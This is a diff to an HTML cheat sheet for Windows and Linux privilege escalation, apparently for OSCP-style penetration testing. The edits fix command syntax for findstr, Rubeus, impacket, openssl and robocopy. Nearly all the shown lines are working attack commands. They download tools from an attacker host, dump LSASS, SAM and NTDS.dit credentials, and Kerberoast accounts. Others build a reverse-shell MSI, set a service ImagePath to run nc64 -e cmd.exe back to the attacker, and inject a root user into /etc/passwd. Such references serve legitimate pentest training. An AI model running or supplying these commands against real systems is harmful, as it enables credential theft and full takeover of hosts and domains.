@@ -617,7 +617,7 @@ Use GodPotato as default — it works on almost everything.
 </div>
 <div class="callout callout-tip">
 <strong>Quick OS Check</strong>
-Run <code>systeminfo | findstr /i "OS Name\|Build\|Architecture"</code> first. Build 17763 = Server 2019 / Win10 1809.
+Run <code>systeminfo | findstr /i /c:"OS Name" /c:"Build" /c:"Architecture"</code> first. Build 17763 = Server 2019 / Win10 1809.
 </div>
 </section>
 
@@ -654,7 +654,7 @@ iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -Outfile {{WPATH}}\nc64.ex
 <div class="cmd-wrap"><div class="cmd-label">Detailed OS info — build number, architecture, hotfixes</div>
 <pre class="cmd">systeminfo</pre></div>
 <div class="alts">
-  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">systeminfo | findstr /i "OS Name\|OS Version\|Build\|Architecture"</code></div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">systeminfo | findstr /i /c:"OS Name" /c:"OS Version" /c:"Build" /c:"Architecture"</code></div>
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">wmic os get Caption,Version,BuildNumber,OSArchitecture</code></div>
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">Get-ComputerInfo</code></div>
 </div>
@@ -813,7 +813,7 @@ copy PowerUp.ps1 "C:\windows\temp\system32.ps1"
 <pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/RunasCs.exe -Outfile {{WPATH}}\RunasCs.exe</pre></div>
 <div class="alts"><div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/RunasCs.exe {{WPATH}}\RunasCs.exe</code> — CMD (no PS)</div></div>
 <div class="cmd-wrap"><div class="cmd-label">Writable directories (for dropping tools)</div>
-<pre class="cmd">icacls C:\ /T /C 2>nul | findstr /i /c:"(F)" /c:"(M)" /c:"(W)" | findstr /i "Users Everyone"
+<pre class="cmd">icacls C:\ /T /C 2>nul | findstr /i /c:"(F)" /c:"(M)" /c:"(W)" | findstr /i /c:"Users" /c:"Everyone"
 # (F)=FullControl, (M)=Modify (can replace binary!), (W)=Write. All three mean writable.</pre>
 </div>
 <div class="alts">
@@ -1021,9 +1021,9 @@ iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SharpUp.exe -Outfile {{WPATH}}\Shar
 <div class="cmd-wrap"><div class="cmd-label">List running services with non-Windows paths</div>
 <pre class="cmd">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'} | Where-Object {$_.PathName -notlike "*System32*"}</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Alternative: wmic (works in cmd.exe)</div>
-<pre class="cmd">wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"</pre></div>
+<pre class="cmd">wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v """"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Can current user restart services? (needed for reliable trigger)</div>
-<pre class="cmd">whoami /groups | findstr /i "Administrat\|Service\|Power"
+<pre class="cmd">whoami /groups | findstr /i /c:"Administrat" /c:"Service" /c:"Power"
 sc.exe query type= all state= all | findstr /i "SERVICE_NAME"</pre></div>
 </div>
 <div class="pipe-step pipe-confirm">
@@ -1293,7 +1293,7 @@ Windows tries each space-split point in order:<br>
 <div class="pipe-step pipe-detect">
 <span class="pipe-step-label">1. DETECT — find unquoted service paths</span>
 <div class="cmd-wrap"><div class="cmd-label">Find services with spaces and no quotes (the vulnerable pattern)</div>
-<pre class="cmd">wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"</pre></div>
+<pre class="cmd">wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v """"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">PowerShell filter — spaces but no quotes = unquoted path</div>
 <pre class="cmd">Get-CimInstance -ClassName win32_service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } | Select Name,PathName,StartMode</pre></div>
 </div>
@@ -1605,7 +1605,7 @@ reg query HKCU\Software\ORL\WinVNC3\Password 2>nul</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Windows Credential Manager saved credentials</div>
 <pre class="cmd">cmdkey /list</pre></div>
 <div class="alts">
-  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">vaultcmd /list</code></div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">vaultcmd /listcreds:"Windows Credentials"</code></div>
 </div>
 
 <div class="cmd-wrap"><div class="cmd-label">IIS web.config database connection strings</div>
@@ -1739,7 +1739,7 @@ reg save hklm\system {{WPATH}}\system.bak</pre></div>
 <span class="pipe-step-label">2. EXPLOIT — transfer and install MSI as SYSTEM</span>
 <div class="cmd-wrap"><div class="cmd-label">Download and silently install (runs as SYSTEM due to policy)</div>
 <pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/evil.msi -Outfile {{WPATH}}\evil.msi
-msiexec /quiet /qn /i {{WPATH}}\evil.msi</pre></div>
+msiexec /qn /i {{WPATH}}\evil.msi</pre></div>
 </div>
 <div class="pipe-step pipe-verify">
 <span class="pipe-step-label">3. VERIFY — confirm escalation</span>
@@ -1819,7 +1819,7 @@ Get-UnquotedService</pre></div>
 PowerSharpPack -winPEAS
 PowerSharpPack -SharpUp
 PowerSharpPack -seatbelt -Command "AMSIProviders"
-PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"
+PowerSharpPack -Rubeus -Command "kerberoast /outFile:Roasted.txt"
 PowerSharpPack -Watson</pre></div>
 </div>
 <div class="tool-card">
@@ -1897,7 +1897,7 @@ GodPotato → PrintSpoofer → SweetPotato → SigmaPotato → RoguePotato → J
 {{WPATH}}\FullPowers.exe -c "{{WPATH}}\GodPotato-NET4.exe -cmd whoami" -z
 # ⚠️ Do NOT skip potatoes just because the privilege shows Disabled!</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Check OS build — determines which potato to use</div>
-<pre class="cmd">systeminfo | findstr /i "OS Name\|OS Version\|Build"
+<pre class="cmd">systeminfo | findstr /i /c:"OS Name" /c:"OS Version" /c:"Build"
 # Build 17763+ (Server 2019 / Win10 1809+) = JuicyPotato FAILS → use GodPotato</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">PowerShell alternative</div>
 <pre class="cmd">[System.Environment]::OSVersion.Version
@@ -2066,14 +2066,15 @@ reg save hklm\security {{WPATH}}\security.hive
 # Transfer to Kali then:
 impacket-secretsdump -system system.hive -sam sam.hive -security security.hive local</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Method B — Domain Controller: copy NTDS.dit (contains ALL domain hashes)</div>
-<pre class="cmd"># SeBackupPrivilege lets robocopy bypass ACLs — /B = backup mode
-robocopy /B /MIR /ZB C:\Windows\NTDS {{WPATH}}\ntds_copy
+<pre class="cmd"># SeBackupPrivilege lets robocopy bypass ACLs — /B = backup mode, /ZB = resume fallback
+robocopy /B /ZB C:\Windows\NTDS {{WPATH}}\ntds_copy
 reg save hklm\system {{WPATH}}\system.hive
 # Transfer ntds.dit + system.hive to Kali, then:
 impacket-secretsdump -ntds {{WPATH}}\ntds_copy\ntds.dit -system system.hive LOCAL</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Method B (Alternative) — diskshadow + robocopy</div>
-<pre class="cmd"># Create shadow.txt first (each command MUST be on its own line):
-echo set context persistent nowriters > {{WPATH}}\shadow.txt
+<pre class="cmd"># Create shadow.txt first (each command MUST be on its own line; first line MUST be a # comment):
+echo # diskshadow script > {{WPATH}}\shadow.txt
+echo set context persistent nowriters >> {{WPATH}}\shadow.txt
 echo add volume c: alias mysnap >> {{WPATH}}\shadow.txt
 echo create >> {{WPATH}}\shadow.txt
 echo expose %mysnap% z: >> {{WPATH}}\shadow.txt
@@ -2099,7 +2100,7 @@ tasklist /fi "IMAGENAME eq lsass.exe"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Exploit — inject into SYSTEM process</div>
 <pre class="cmd">{{WPATH}}\SeDebugPrivesc.exe &lt;WINLOGON_PID&gt; cmd.exe</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Alternative — dump LSASS (requires SeDebug)</div>
-<pre class="cmd">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\lsass.dmp full</pre></div>
+<pre class="cmd">powershell -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\lsass.dmp full"</pre></div>
 </div>
 
 <div class="subsection"><div class="subsection-title">SeManageVolumePrivilege Abuse</div>
@@ -2310,7 +2311,7 @@ iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe -Outfile {{WPATH}}\mim
 <pre class="cmd">tasklist /fi "imagename eq lsass.exe"
 Get-Process lsass</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Method 1: comsvcs.dll (most stealthy, built-in)</div>
-<pre class="cmd">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\lsass.dmp full</pre></div>
+<pre class="cmd">powershell -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\lsass.dmp full"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Method 2: procdump (Sysinternals)</div>
 <pre class="cmd">{{WPATH}}\procdump.exe -accepteula -ma lsass.exe {{WPATH}}\lsass.dmp</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Method 3: Mimikatz live</div>
@@ -2338,7 +2339,7 @@ iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -Outfile {{WPATH}}\nc64.ex
 <div class="cmd-wrap"><div class="cmd-label">List all saved credentials</div>
 <pre class="cmd">cmdkey /list</pre></div>
 <div class="alts">
-  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">vaultcmd /list</code></div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">vaultcmd /listcreds:"Windows Credentials"</code></div>
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">rundll32.exe keymgr.dll,KRShowKeyMgr</code> — GUI</div>
 </div>
 <div class="callout callout-info" style="margin:6px 0">
@@ -2469,7 +2470,7 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v ImagePat
 <div class="callout callout-warn"><strong>⚠️ Hashcat modes:</strong> <code>-m 13100</code> = Kerberoast TGS-REP (hash starts with <code>$krb5tgs$</code>) | <code>-m 18200</code> = AS-REP Roasting (hash starts with <code>$krb5asrep$</code>). Do NOT mix them up.</div>
 <div class="subsection"><div class="subsection-title">Kerberoasting — from Kali (impacket)</div>
 <div class="cmd-wrap"><div class="cmd-label">Request TGS tickets and save (requires -request flag to get hashes)</div>
-<pre class="cmd">impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{TARGET}} -request -outputfile kerberoast.txt</pre></div>
+<pre class="cmd">impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{TARGET}} -request -output-file kerberoast.txt</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">List SPNs only (without -request — see what accounts exist first)</div>
 <pre class="cmd">impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{TARGET}}</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Crack TGS-REP hashes — hashcat mode 13100 = Kerberoast</div>
@@ -2478,14 +2479,14 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v ImagePat
 </div>
 <div class="subsection"><div class="subsection-title">Kerberoasting — from Windows (Rubeus)</div>
 <div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/Rubeus.exe {{WPATH}}\Rubeus.exe</pre></div>
-<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe kerberoast /outfile:{{WPATH}}\roasted.txt</pre></div>
-<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe kerberoast /format:hashcat /outfile:{{WPATH}}\roasted.txt</pre></div>
+<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe kerberoast /outFile:{{WPATH}}\roasted.txt</pre></div>
+<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe kerberoast /format:hashcat /outFile:{{WPATH}}\roasted.txt</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">AS-REP Roasting (pre-auth disabled accounts)</div>
-<div class="cmd-wrap"><pre class="cmd">impacket-GetNPUsers {{DOMAIN}}/ -usersfile users.txt -dc-ip {{TARGET}} -format hashcat -outputfile asrep.txt</pre></div>
-<div class="cmd-wrap"><pre class="cmd">impacket-GetNPUsers {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{TARGET}} -request -format hashcat -outputfile asrep.txt</pre></div>
+<div class="cmd-wrap"><pre class="cmd">impacket-GetNPUsers {{DOMAIN}}/ -usersfile users.txt -dc-ip {{TARGET}} -format hashcat -output-file asrep.txt</pre></div>
+<div class="cmd-wrap"><pre class="cmd">impacket-GetNPUsers {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{TARGET}} -request -format hashcat -output-file asrep.txt</pre></div>
 <div class="cmd-wrap"><pre class="cmd">hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force</pre></div>
-<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe asreproast /format:hashcat /outfile:{{WPATH}}\asrep.txt</pre></div>
+<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe asreproast /format:hashcat /outFile:{{WPATH}}\asrep.txt</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">AD Recycle Bin — extract deleted object credentials</div>
 <div class="callout callout-tip"><strong>💡</strong> Seen on AD machines — deleted users may still have password attributes recoverable from the recycle bin.</div>
@@ -2723,9 +2724,9 @@ whoami /priv | findstr SeImpersonate
 <div class="pipe-step pipe-detect">
 <span class="pipe-step-label">1. DETECT — find vulnerable certificate templates</span>
 <div class="cmd-wrap"><div class="cmd-label">From Kali (authenticated domain user required)</div>
-<pre class="cmd">certipy find -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' -dc-ip {{TARGET}} -vulnerable -stdout
+<pre class="cmd">certipy find -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' -dc-ip {{TARGET}} -vulnerable -text
 # Hashes also work:
-certipy find -u {{USER}}@{{DOMAIN}} -hashes :NTLM_HASH -dc-ip {{TARGET}} -vulnerable -stdout</pre></div>
+certipy find -u {{USER}}@{{DOMAIN}} -hashes :NTLM_HASH -dc-ip {{TARGET}} -vulnerable -text</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">From Windows target (no tools, check if ADCS web enrollment is running)</div>
 <pre class="cmd">curl -s -k http://{{TARGET}}/certsrv/ 2>nul && echo "ADCS web enrollment detected"
 certutil -config - -ping 2>nul | findstr "Config"</pre></div>
@@ -2923,8 +2924,8 @@ sudo umount /mnt/smb</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">Rubeus — Kerberos Attack Workflow</div>
 <div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/Rubeus.exe {{WPATH}}\Rubeus.exe</pre></div>
-<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe kerberoast /format:hashcat /outfile:{{WPATH}}\roast.txt</pre></div>
-<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe asreproast /format:hashcat /outfile:{{WPATH}}\asrep.txt</pre></div>
+<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe kerberoast /format:hashcat /outFile:{{WPATH}}\roast.txt</pre></div>
+<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe asreproast /format:hashcat /outFile:{{WPATH}}\asrep.txt</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe dump /service:krbtgt /nowrap</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe ptt /ticket:BASE64_TICKET</pre></div>
 <div class="cmd-label">Crack on Kali</div>
@@ -3522,7 +3523,7 @@ cat /etc/crontab</pre></div>
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">while true; do ps -aux | grep -i 'pass\|cred\|secret' | grep -v grep; sleep 2; done</code></div>
 </div>
 <div class="cmd-wrap"><div class="cmd-label">Sniff loopback for plaintext passwords</div>
-<pre class="cmd">sudo tcpdump -i lo -A | grep "pass"</pre></div>
+<pre class="cmd">sudo tcpdump -i lo -A -c 100 | grep "pass"</pre></div>
 <div class="alts">
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">tcpdump -i any -s0 -w capture.pcap</code></div>
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">tcpdump -i lo -A -n | grep -iE 'user|pass|login'</code></div>
@@ -3604,7 +3605,7 @@ ls -la /path/to/script.sh.bak</pre></div>
 # After cron runs, escalate:
 /tmp/rootbash -p</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Option C: Add root user to /etc/passwd (persistent)</div>
-<pre class="cmd">echo 'echo "newroot:$(openssl passwd Password123):0:0:root:/root:/bin/bash" >> /etc/passwd' >> /path/to/script.sh
+<pre class="cmd">echo 'echo "newroot:$(openssl passwd -6 Password123):0:0:root:/root:/bin/bash" >> /etc/passwd' >> /path/to/script.sh
 # After cron runs:
 su newroot  # password: Password123</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Check when the cron runs — how long to wait?</div>
@@ -5294,8 +5295,8 @@ sudo -l | grep dosbox</pre></div>
 bash -p
 id</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Method 2: Inject new root user into /etc/passwd via dosbox</div>
-<pre class="cmd"># Generate password hash on Kali:
-openssl passwd -1 Password123
+<pre class="cmd"># Generate password hash on Kali (use -6 for SHA-512 on modern systems, -1 for MD5 fallback):
+openssl passwd -6 Password123
 # Then inject via dosbox (replace HASH with openssl output):
 dosbox -c 'mount c /' -c 'echo "root2:HASH:0:0:root:/root:/bin/bash" >> c:/etc/passwd' -c exit
 su root2  # password: Password123
@@ -5511,8 +5512,8 @@ rm /tmp/rootbash</pre></div>
 <!-- ── HIDDEN FILES ── -->
 <div class="subsection"><div class="subsection-title">1. Hidden Files &amp; Directories</div>
 <div class="cmd-wrap"><div class="cmd-label">Find ALL hidden files (dot-prefixed) — skip proc/sys noise</div>
-<pre class="cmd">find / -name ".*" -type f -not -path "*/proc/*" -not -path "*/sys/*" -not -path "*/dev/*" 2>/dev/null
-find / -name ".*" -type f -not -path "*/proc/*" -not -path "*/sys/*" 2>/dev/null | grep -v "\.cache\|\.config/google\|\.local/share/mime"</pre></div>
+<pre class="cmd">find / -name ".*" -type f -not -path "*/proc/*" -not -path "*/sys/*" -not -path "*/dev/*" -not -path "*/run/*" 2>/dev/null
+find / -name ".*" -type f -not -path "*/proc/*" -not -path "*/sys/*" -not -path "*/run/*" 2>/dev/null | grep -v "\.cache\|\.config/google\|\.local/share/mime"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Hidden files in home directories only (fast)</div>
 <pre class="cmd">find /home /root -name ".*" -type f 2>/dev/null
 find /home /root -name ".*" 2>/dev/null | xargs ls -la 2>/dev/null</pre></div>
@@ -6732,7 +6733,7 @@ const DT = {
       opts:[{l:'Domain Controller (dump ALL domain hashes via NTDS)',n:'backup_dc'},
             {l:'Regular server/workstation (dump local SAM)',n:'backup_sam'}]},
     backup_dc: {q:'Dump NTDS.dit via robocopy /B (backup mode bypasses ACLs)',final:true,s:'win-exploits',
-      cmds:['robocopy /B /MIR /ZB C:\\Windows\\NTDS {{WPATH}}\\ntds_copy',
+      cmds:['robocopy /B /ZB C:\\Windows\\NTDS {{WPATH}}\\ntds_copy',
             'reg save hklm\\system {{WPATH}}\\system.hive',
             '# Transfer ntds_copy\\ + system.hive to Kali, then:',
             'impacket-secretsdump -ntds {{WPATH}}\\ntds_copy\\ntds.dit -system system.hive LOCAL']},
@@ -6745,7 +6746,7 @@ const DT = {
       cmds:['tasklist /fi "IMAGENAME eq winlogon.exe"  # get PID',
             '{{WPATH}}\\SeDebugPrivesc.exe <WINLOGON_PID> cmd.exe',
             '# LSASS dump alternative:',
-            'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id {{WPATH}}\\lsass.dmp full',
+            'powershell -c "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\\lsass.dmp full"',
             '# Transfer lsass.dmp to Kali → pypykatz lsa minidump lsass.dmp']},
     loaddriver: {q:'SeLoadDriverPrivilege → load Capcom.sys → SYSTEM via ExploitCapcom',final:true,s:'win-exploits',
       cmds:['{{WPATH}}\\eoploaddriver.exe System\\CurrentControlSet\\dfserv {{WPATH}}\\Capcom.sys',
@@ -6783,7 +6784,7 @@ const DT = {
             'sc.exe stop <ServiceName> && sc.exe start <ServiceName>',
             '# OR if no restart: net stop <ServiceName> /y && net start <ServiceName>']},
     uqpath: {q:'Unquoted path → place exe at space split point',final:true,s:'win-uqpath',
-      cmds:['wmic service get name,pathname | findstr /i /v "c:\\\\windows\\\\"',
+      cmds:['wmic service get name,pathname | findstr /i /v "c:\\windows\\"',
             '# C:\\Program Files\\My App\\service.exe → try C:\\Program.exe or C:\\Program Files\\My.exe',
             '# Copy payload to split point, then restart service']},
     aie: {q:'AlwaysInstallElevated → MSI runs as SYSTEM',final:true,s:'win-aie',
@@ -6791,13 +6792,13 @@ const DT = {
             'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
             '# Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f msi -o evil.msi',
             'iwr -uri http://{{KALI_IP}}:{{PORT}}/evil.msi -Outfile {{WPATH}}\\evil.msi',
-            'msiexec /quiet /qn /i {{WPATH}}\\evil.msi']},
+            'msiexec /qn /i {{WPATH}}\\evil.msi']},
     regdacl: {q:'Weak registry DACL → overwrite ImagePath with payload',final:true,s:'win-regdacl',
       cmds:['# Confirm writable (PS): (Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<Svc>).Access',
             'reg add HKLM\\System\\CurrentControlSet\\Services\\<Svc> /v ImagePath /t REG_EXPAND_SZ /d "cmd /c {{WPATH}}\\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}" /f',
             'sc.exe stop <Svc> && sc.exe start <Svc>']},
     schtask: {q:'Scheduled task binary writable → replace binary, wait for trigger',final:true,s:'win-schtask',
-      cmds:['schtasks /query /fo LIST /v | findstr /i "Task Name\\|Run As User\\|Task To Run\\|Next Run"',
+      cmds:['schtasks /query /fo LIST /v | findstr /i /c:"Task Name" /c:"Run As User" /c:"Task To Run" /c:"Next Run"',
             'copy "C:\\Path\\TaskBin.exe" "C:\\Path\\TaskBin.exe.bak"',
             'copy {{WPATH}}\\shell.exe "C:\\Path\\TaskBin.exe"',
             '# Wait for next run, or: schtasks /run /tn "<TaskName>"']},
@@ -6896,7 +6897,7 @@ const DT = {
             {l:'Kernel might be exploitable',n:'kernel'},
             {l:'Nothing → run LinPEAS and go deep',n:'lin_deep'}]},
     etc_passwd: {q:'Writable /etc/passwd → inject root user with no password check',final:true,s:'lin-passwd',
-      cmds:['ls -la /etc/passwd','echo "newroot:$(openssl passwd -1 Password123):0:0:root:/root:/bin/bash" >> /etc/passwd','su newroot  # Password: Password123']},
+      cmds:['ls -la /etc/passwd','echo "newroot:$(openssl passwd -6 Password123):0:0:root:/root:/bin/bash" >> /etc/passwd','su newroot  # Password: Password123']},
     nfs: {q:'NFS no_root_squash → Kali mounts share, creates SUID bash',final:true,s:'lin-nfs',
       cmds:['cat /etc/exports | grep -v "^#" | grep no_root_squash',
             '# On Kali (as root):', 'mkdir /mnt/nfs && mount -t nfs -o rw,vers=3 {{TARGET}}:/share /mnt/nfs',
